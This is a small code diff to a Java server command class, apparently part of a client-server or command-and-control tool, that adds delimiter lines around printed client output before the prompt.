@@ -18,14 +18,15 @@ public class OutCmd extends ServerCommand {
 	@Override
 	public String exec(ParsedCommand pCmd) {
 		// Newline after >
-		System.out.print('\n');
+		System.out.print("\n-----BEGIN CLIENT OUTPUT-----\n");
 		
 		// Printing payload
 		for (int i = 0; i < pCmd.payload.length; i++)
 			System.out.print((char) pCmd.payload[i]);
 		
 		// Printing the prefix
-		System.out.print("\n" + c2.getPrefix() + ">");
+		System.out.print("\n-----END CLIENT OUTPUT-----\n"
+						 + c2.getPrefix() + ">");
 		
 		if (c2.getCurrentClient() >= 0)
 			return N_DONE;
